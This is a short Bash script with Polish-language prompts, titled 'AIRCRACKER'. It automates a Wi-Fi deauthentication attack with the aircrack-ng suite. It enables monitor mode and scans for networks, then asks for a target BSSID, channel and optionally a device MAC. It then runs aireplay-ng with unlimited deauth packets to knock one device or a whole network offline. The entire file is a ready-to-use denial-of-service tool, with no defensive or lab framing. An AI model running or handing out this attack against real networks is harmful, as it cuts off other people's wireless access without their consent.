#! /bin/bash
figlet "AIRCRACKER" 
ifconfig
read -r -p "Wprowadź interfejs sieciowy nasłuchu - " WLAN
sudo airmon-ng start $WLAN
sleep 1.5
clear
echo -e "1. DEAUTH URZĄDZENIA Z SIECI \n2. DEAUTCH CAŁEJ SIECI"
while true
do
 read -r -p "Wybierz opcję  - " input
 
 case $input in
     [1][eE][sS]|[1])
  echo "Startuje skrypt... " 
  sleep 1.5
  clear
  echo "W celu przerwania scanu naciśnij CTRL+C" 
  sudo airodump-ng wlan0mon
  read -r -p "Wprowadź BSSID sieci - " BSSID
  read -r -p "Wprowadź kanał sieci - " CH
  clear
  echo "W celu przerwania scanu naciśnij CTRL+C" 
  sudo airodump-ng -d $BSSID -c $CH wlan0mon
  read -r -p "Wprowadź MAC urządzenia - " MAC
  clear
  sudo aireplay-ng -0 0 -a $BSSID -c $MAC wlan0mon
  echo "Dziękuje za skorzystanie ze skryptu !" 
  sudo airmon-ng stop wlan0mon
 break
 ;;
     [2][oO]|[2])
  echo "Startuje skrypt... " 
  sleep 1.5
  clear
  echo "W celu przerwania scanu naciśnij CTRL+C" 
  sudo airodump-ng wlan0mon
  read -r -p "Wprowadź BSSID sieci - " BSSID
  read -r -p "Wprowadź kanał - " CH
  clear
  echo "W celu przerwania scanu naciśnij CTRL+C" 
  sudo airodump-ng -d $BSSID -c $CH wlan0mon
  clear
  sudo aireplay-ng -0 0 -a $BSSID wlan0mon
  echo "Dziękuje za skorzystanie ze skryptu !"
  sudo airmon-ng stop wlan0mon
 break
 ;;
     *)
 echo "Nieprawidłowa komenda" 
 ;;
 esac
done




